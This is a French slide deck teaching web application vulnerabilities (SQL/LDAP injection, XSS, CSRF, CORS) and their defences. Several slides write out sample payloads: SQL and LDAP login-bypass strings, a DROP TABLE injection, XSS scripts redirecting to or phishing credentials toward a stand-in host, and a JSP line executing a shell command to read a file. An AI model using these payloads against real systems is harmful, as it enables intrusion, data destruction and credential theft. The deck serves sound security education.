<!-- .slide: data-background-image="images/securite-informatique.png" data-background-size="1200px" class="chapter" -->
## 1
### Failles applicatives






<!-- .slide: class="slide" -->
### Qu'est ce qu'une faille applicative ?
**Wikipedia**

*Une vulnérabilité ou faille est une faiblesse dans un système informatique permettant à un attaquant de porter atteinte à l'intégrité de ce système, c'est-à-dire à son fonctionnement normal, à la confidentialité ou à l'intégrité des données qu'il contient*






<!-- .slide: class="slide" -->
### Qu'est ce qu'une faille applicative ?
- Une erreur de programmation (bug, fonctionnalité mal implémentée) ?
- Une erreur de configuration ?
- Une erreur de conception ?








<!-- .slide: class="slide" -->
### Une erreur de conception ?
*Soit une plateforme de réservation en ligne pour des chambres d'hôtel.*

*Je propose aux utilisateurs d'annuler leurs commandes jusqu'à 16 h.*

*Un concurrent peut facilement pourrir mon hôtel en réservant toutes les chambres et en les annulant à 15h55.*

Est ce que cela fait partie du fonctionnement normal ?





<!-- .slide: class="slide" -->
### Une erreur de conception ?
*Sur le WS gestion des contacts, on peut créer autant d'habilitations que l'on veut pour un contact*

Au delà d'environ 300 habilitations c'est l'annuaire qui finit par planter...






<!-- .slide: class="slide" -->
### Une erreur de configuration ?
- L'application n'est pas diffusée en HTTPS
- Failles au niveau du système d'exploitation







<!-- .slide: class="slide" -->
### Une erreur de programmation ?
- Son propre code
- Les bibliothèques utilisées : Nécéssité de mise à jour régulière !






<!-- .slide: class="slide" -->
### Une erreur de programmation ?
- Le top 10 des erreurs de programmation : OWASP
- https://owasp.org/www-project-top-ten/







<!-- .slide: class="slide" -->
### Une erreur de programmation ?
- A1 et A7 : Injection de code
- A2 : Vol de session : souvent permis par de l'injection de code
- A9 : Utilisation de bibliothèques obsoletes (bugs des "autres")








<!-- .slide: class="slide" -->
### L'injection de code
<img src="./images/injection_sql.png" width="100%" />
> https://imgs.xkcd.com/comics/exploits_of_a_mom.png








<!-- .slide: class="slide" -->
### L'injection de code
Que s'est-il passé ?

>## École municipale de Kelkepare
>### Inscription d'un nouvel élève
>
>Prénom : <input id="scriptEvil0" type="text" /> <button onClick="injection();" >Inscrire l'élève</button>
><ul id="myUl0"></ul>






<!-- .slide: class="slide" -->
### L'injection de code
Que s'est-il passé ?
```java
public void inscrireEleve(String prenom){
  String maRequeteSQL = "INSERT INTO Students VALUES ('" + prenom + "')";
  connectionSql.createStatement().executeQuery(maRequeteSQL);
}
```






<!-- .slide: class="slide" -->
### L'injection de code
Que s'est-il passé ?
- Si on remplit dans le formulaire `Robert'); DROP TABLE Students;--`
- La requète envoyée au serveur devient : 
```
INSERT INTO Students VALUES ('Robert'); DROP TABLE Students;--')
```








<!-- .slide: class="slide" -->
### L'injection de code : Injection SQL ou LDAP

Pourquoi ?
- Consulter des données confidentielles
- Altérer la base de données  

Exemples
  - En SQL
```java
"SELECT * FROM USER WHERE identifiant='" + username + "' AND password='" + password + "'";
```
à renseigner avec username=`robichu` et password=`' OR '1'='1' --` pour se connecter en tant que M Robichu
  - En LDAP
```java
"(&(uid = " + user_name + ") (userpassword = " + user_password + "))";
```
 à renseigner avec username=`robichu)(&)` pour se connecter en tant que M Robichu








<!-- .slide: class="slide" -->
### L'injection de code : Injection SQL ou LDAP
Sécurité :
- Échapper les caractères spéciaux 
- => Utiliser des PreparatedStatement
- => Utiliser des Frameworks qui font le boulot (hibernate, ...)






<!-- .slide: class="slide" -->
### L'injection de code

>## École municipale de Kelkepare
>### Inscription d'un nouvel élève
>
>Prénom : <input id="scriptEvil" type="text" /> <button onClick="fonction()">Inscrire l'élève</button>
>
><ul id="myUl"></ul>







<!-- .slide: class="slide" -->
### L'injection de code
Et si j'écrit dans le formulaire :
- `<form action="https://no.domain" >Entrez votre mot de passe : <input type="text" name="password" /><button type="submit">Me connecter</button></form>`
- `<button onclick="window.location='https://no.domain'" >Continuer</button>`







<!-- .slide: class="slide" -->
### L'injection de code
On peut forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action
- En le redirigeant sur la page avec des paramètres de requete trafiqués
- En stockant en base un code qui va être réaffiché









<!-- .slide: class="slide" -->
### L'injection de code
- On peut ainsi rajouter ce genre de code sur la page de l'utilisateur
```html
<script>document.location="https://no.domain"</script>
```
```html
<script>
document.getElementsByTagName("body")[0].innerHTML("
<form action='https://no.domain' >
<br>Connectez vous !<br>
<input type='text' name='email'>
<input type='password' name='mot de passe'>
<input type='submit' value='Connexion'>
</form>
")
</script>
```







<!-- .slide: class="slide" -->
### L'injection de code : XSS (Cross-Site Scripting)
Pourquoi ?
- Vol de données, en particulier des cookies de session
- Redirection malveillante

Comment ?
- Consiste à injecter du code et en particulier des script dans une page web
- Le pirate fournit une requête vers un site légitime mais dont le contenu injecte le code
- Injection "en direct" par le serveur, on parle de reflected XSS
- On l'appelle DOM XSS, si elle consiste à modifier le DOM via un script
- Pire, XSS Stored : le pirate arrive à écrire ce code dans une base de données ou dans un fichier local. Il n'a même plus besoin de fournir un lien trafiqué à l'utilisateur.







<!-- .slide: class="slide" -->
### Digression : La session HTTP
- Dans le cas d'une utilisation par navigateur, on veut souvent conserver des informations sur l'utilisateur sur la durée de sa consultation : on dit que l'application est Stateful. (Au contraire un web service est stateless)
- Si l'authentification demande un identifiant/mot de passe dans un formulaire, renouveler l'opération à chaque opération peut provoquer une mauvaise expérience utilisateur.
- Si l'authentification est externe (fournisseur d'identité) le maintient d'une session est indispensable.






<!-- .slide: class="slide" -->
### Digression : La session HTTP
- Concrètement la session est un ensemble de donnée à usage court. 
- Dans le cas d'une authentification, un identifiant à usage unique attribué par le serveur permet de rappeler à chaque requête qui on est.
- D'une façon générale les données de session sont conservées côté serveur et le client ne possède qu'un identifiant de session.
- Cette identifiant est stocké dans le navigateur sous la forme d'un cookie.






<!-- .slide: class="slide" -->
### Digression : La session HTTP
- Si le serveur ne me connait pas encore (si je ne lui fournit pas de cookie), il m'en propose un :
```
Set-Cookie: JSESSIONID=ABCDEF123456; Secure; HttpOnly
```
- Pour "maintenir ma session", je dois rajouter ce cookie à chaque requête :
```
Cookie: JSESSIONID=ABCDEF123456
```
- Au bout d'un certain temps d'inactivité, le serveur supprime cet identifiant de session de sa mémoire. En cas de reconnexion, mon cookie est alors invalide, il m'en propose un nouveau, mais je ne suis donc plus connu de l'application (perte de l'authentification notamment).

Déconnecter un utilisateur = invalider son cookie de session.






<!-- .slide: class="slide" -->
### Digression : La session HTTP
Vol de session ?

Si j'arrive à récupérer le cookie de session de l'utilisateur je peux utiliser l'application en son nom (le temps de la session, mais c'est bien suffisant !)






<!-- .slide: class="slide" -->
### L'injection de code : XSS (Cross-Site Scripting)

Sécurité :
- Vérifier les entrées utilisateurs !
- Echapper caractères spéciaux HTML (utiliser au maximum les sécurités internes des framework, sinon des fonctions existent déjà dans les principaux langages, par exemple `${fn:escapeXml(string)}` dans une EL en JSP)
- Forcer les cookies à être "secure" (utilisable en https uniquement), "httpOnly" (non utilisable dans les scripts)
- Précision : il s'agit de sécurité déclarative dont la mise en oeuvre est à la charge du navigateur






<!-- .slide: class="slide" -->
### Avant de continuer...
Découvrons une série challenge disponible sur internet
- [Natas 0](http://natas0.natas.labs.overthewire.org) (mot de passe de natas0 : `natas0`)
- Sur les premiers niveaux, on voit qu'une resource cachée n'est jamais cachée (<a href="digressions.html" target="_blank">Digression : robots.txt</a>) et que quelques éléments pouvent être très facilement manipulés dans la requête







<!-- .slide: class="slide" -->
### L'injection de code
Quelques niveaux plus tard :
- [Natas 12](http://natas12.natas.labs.overthewire.org) (mot de passe de natas12 : `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`)
- Le but est de découvrir le mot de passe de natas13 situé dans /etc/natas_webpass/natas13
- Hint : passthru est une fonction php permettant d'éxécuter sur le sytème du code arbitraire <!-- .element: class="fragment"-->









<!-- .slide: class="slide" -->
### L'injection de code
Exécution de code sur le serveur

- Mettre un fichier malicieux sur le serveur permettant l'éxécution de code à distance.
- Ici le code injecté sera du code serveur (java sur jsp, php)
- Nombreuses possibilités : aussi bien des traitements dans l'application non prévus que des opérations directement sur le système d'exploitation
- Par exemple réussir à placer sur le serveur une jsp contenant :
```jsp
<%Runtime.getRuntime().exec("less /confidentiel/data");%>
```







<!-- .slide: class="slide" -->
### L'injection de code
Exécution de code sur le serveur

Sécurité :
- Contrôler les entrées utilisateurs : en particulier pour les entrées de fichier contrôler le type MIME des entrées, et l'extention de fichier nommé car le serveur et/ou le navigateur peut interpréter différemment un fichier selon son nommage
- Côté prod "chroot" des applications et utilisateur a droit limités







<!-- .slide: class="slide" -->
### L'injection de code
Qu'est ce qu'une entrée utilisateur ?
- Requête et Paramètres de requête
- Corps de requête (contenu des requête POST et PUT) : réponse à un formulaire, fichier
- Cookies
- [Entetes HTTP](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers) (Authorization, Location, Host, User-Agent, Referrer, Cookies, CORS, ...)

Controle des chaines entrées et échappement de tous les caratères interprétables en html, en sql,... selon la situation.

Un développeur web peut se contenter de surveiller ces entrées mais en réalité, les failles peuvent survenir sur n'importe quel bit d'un échange réseau.








<!-- .slide: class="slide" -->
### Les attaques basées sur des échanges entre domaines
- XSS (Cross-Site Scripting) : Le terme regroupe en fait des attaques plus larges basées sur l'injection de script, mais le nom vient de sa principale utilisation.
- XFS (Cross Frame Scripting) attaque consistant à injecter le site légitime dans un iframe sur le site du pirate via un iframe
- Mélange XSS - XFS
- CSRF (Cross-Site Request Forgery) : Le pirate souhaite effectuer une opération en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous êtes authentifié sur le cible cible, l'action s'effectue en votre nom. La vulnérabilité existe sur les authentifications basées sur des cookies ou sur des authentifications sso.







<!-- .slide: class="slide" -->
### Démo CSRF
https://www.root-me.org/fr/Challenges/Web-Client/CSRF-0-protection

Un admin regarde vraiment ses messages de temps en temps !









<!-- .slide: class="slide" -->
### Protections
Problématique :
- On ne cherche pas à empécher une acton malveillante en soi
- On cherche à empécher un utilisateur de faire une opération légitime mais forcée par le pirate. On veut s'assurer que l'utilisateur réalise son opération en pleine conscience.








<!-- .slide: class="slide" -->
### Protections
Pour les XSS
- Vérifier les entrées utilisateurs !

Pour les XFS
- Interdire au navigateur d'afficher la page dans un iframe via l'entête :
```
 X-Frame-Options:<DENY|SAMEORIGIN|ALLOW-FROM https://example.com/>;
```









<!-- .slide: class="slide" -->
### Protections
Pour le CSRF
- Faire en sorte qu'à chaque appel d'un vrai formulaire du site, un jeton à usage unique soit ajouté. Le serveur pourra ainsi s'assurer de la cohérence de la requête
- Spring security effectue d'office cette protection
- Il faut alors ajouter dans chaque formulaire le jeton en hidden
```html
<c:url var="logoutUrl" value="/logout"/>
<form:form action="${logoutUrl}"
  method="post">
<input type="submit"
  value="Se déconnecter" />
<input type="hidden"
  name="${_csrf.parameterName}"
  value="${_csrf.token}"/>
</form:form>
```
- Par défaut tout POST ne contenant pas ce paramètre se soldera par une 403
- Pour lever la protection :
```java
http.csrf().ignoringAntMatchers("/saml/**"); // l'ignorer sur certaines url
http.csrf().disable(); // l'ignorer complètement
```







<!-- .slide: class="slide" -->
### CSRF et applis "modernes"
Frontend JS + Backend Java
- Pas de formulaire côté serveur
- Des requêtes isolée, pas de cookie mais authentification par jeton
- Si je sers "presque" le même service javascript, si l'admin se connecte à mon service, je peux lui faire réaliser toutes les requêtes que je souhaite
- Protection = vérifier l'url où l'admin a récupéré le script








<!-- .slide: class="slide" -->
### La protection CORS
Cross Over Resource Sharing

Scénario d'attaque :
- J'arrive sur un site pirate, qui déclenche un script récupérant une information sur le site cible, par exemple un site interne inaccessible d'Internet. L'information est ainsi chargé sur la page et la suite du script peut par exemple la renvoyer au pirate.
- En pratique, un script éxécuté par le client et appelant une ressource externe effectuera une vérification CORS
- La requête ne fonctionnera que si le site externe renvoit un entête Access-Control-Allow-Origin correspond au domaine du site source










<!-- .slide: class="slide" -->
### La protection CORS
- Pour les requêtes GET et POST "simple" (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requête est directement envoyée mais le résultat ne s'affiche qu'en cas de validation de CORS
- !!! Les navigateurs vont maintenant plus loin et font la même vérification OPTION pour ces requêtes
- Pour les autres requêtes, le navigateur envoie préalablement une requête OPTION, vérifie CORS, et n'exécute la requête qu'en cas de validation
- Le serveur peut également faire la vérification de CORS selon l'entête Origin, qui est généré par le navigateur uniquement (à moins d'utiliser Netscape 8 ou IE 6)







<!-- .slide: class="slide" -->
### La protection CORS
Domaine au sens CORS :
- Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port).
- http://localhost:8080 n'est pas le même domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore différent








<!-- .slide: class="slide" -->
### Scénario CORS
- Un script lance une requête vers un autre domaine que celui où il est exécuté, typiquement via un XMLHttpRequest().
- Le navigateur ajoute l'entete Origin à la requête
- Cet entête n'est pas modifiable par script

```
Origin: https://localhost:8443
```







<!-- .slide: class="slide" -->
### Scénario CORS
- Le serveur recoit la requete et peut contrôler la présence de Origin s'il s'attend à de telles requêtes via script
- Le serveur possède un certain nombre de domaine autorisé à le contacter par script et potentiellement tous (\*)
- Le serveur peut bloquer la requête si elle ne correspond pas à ses domaines autorisés
- Si le serveur choisit de répondre et qu'il est configuré pour, il ajoute un ou plusieurs entêtes Access-Control-Allow-Origin :

```
Access-Control-Allow-Origin: https://localhost:8443
Access-Control-Allow-Origin: http://localhost:8080
```

- S'il accepte n'importe quel requête issue d'un script :

```
Access-Control-Allow-Origin: *
```







<!-- .slide: class="slide" -->
### Scénario CORS
- Le navigateur lit la réponse du serveur
- Si elle est vide (le serveur a refusé de répondre) ou si elle est rempli mais ne contient pas d'entête Access-Control-Allow-Origin ou qu'aucun entête Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script

Gestion des erreurs :
- Pour debugger, la console du navigateur vous prévient que la réponse a été bloquée

Test :
<button onClick="testCors();">Test CORS KO</button>
<button onClick="testCorsOk();">Test CORS OK</button>








<!-- .slide: class="slide" -->
### La protection CORS
- Attention à l'autorisation globale (elle peut parfois être nécessaire cependant) : `Access-Control-Allow-Origin: *`
- L'idéal est de controler côté serveur l'entete "Origin" et de personnaliser l'entete "Access-Control-Allow-Origin" si on accepte
- Le détails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS

<!--Keycloak
- Si l'application cliente est publique, la configuration Keycloak possède des "Origin" autorisées
- Ces "Origin" sont inscrites dans le token, on peut ensuite configurer le backend pour qu'il renvoit les entetes CORS selon la correspondance entre "Origin" et le contenu de jeton-->







<!-- .slide: class="slide" -->
### La protection CORS
- Il faut garder à l'esprit que CORS est une sécurité *côté client* pour l'empécher de faire n'importe quoi malgré lui : fournir à un script une information que le serveur n'a pas prévu d'être utilisée par un script.









<!-- .slide: class="slide" -->
### Synthèse
Deux grands types de protection
- Vérifier les entrées utilisateurs ! (Sécurité active)
- Vérifier que l'utilisateur est bien conscient de ses actions :
  - Vérification d'état (Sécurité active)
  - Dire au navigateur quelles opérations sont légitimes ou non (Sécurité déclarative)









<!-- .slide: class="slide" -->
### S'initier aux failles applicatives
- [OWASP](https://www.owasp.org)
  - Documentation et notamment le OWASP top 10
  - WebGoat (découverte de failles sous forme de cours)
  - Juice Store (challenges)
- [Natas](https://overthewire.org/wargames/natas/)
- [Root Me](https://www.root-me.org/)

Par ailleurs le [CERT-FR](https://www.cert.ssi.gouv.fr/) est un sytème de notification des failles applicatives. Il publie aussi régulièrement des articles de cybersécurité.








<!-- .slide: class="slide" -->
### Surveiller les dépendances obsolètes
- Dependabot (vérification existance d'une nouvelle version)
- Pour vérifier vulnérabilités connues : https://owasp.org/www-project-dependency-check/